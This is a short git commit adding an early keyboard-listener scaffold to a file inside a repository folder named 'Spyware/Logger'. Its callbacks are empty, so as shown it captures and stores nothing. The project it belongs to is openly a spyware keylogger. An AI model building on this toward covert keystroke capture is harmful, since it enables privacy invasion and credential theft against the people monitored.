9df911925a9b918223c0529c47578716c7947904
Hjt <ronaldohjt2@gmail.com>
2024-03-31 14:23:43 +0330

    feat(keyboard_listener)
    feat(keyboard_listener): Add keyboard event listening functionality with tests

--- Spyware/Logger/tracker.py
+++ Spyware/Logger/tracker.py
@@ -1,1 +1,17 @@
 from pynput.keyboard import Listener
+
+
+def convert_key(key):
+    return str(key).replace("'", '').split('.')[-1]
+
+
+def keyboard_listener() -> None:
+    with Listener(on_press=None, on_release=None) as keyboard:
+        keyboard.join()
+
+
+if __name__ == '__main__':
+    print(convert_key('Key.ctrl_l'))
+    print(convert_key('Key.shift_r'))
+    print(convert_key('Key.a'))
+    print(convert_key('Key.esc'))
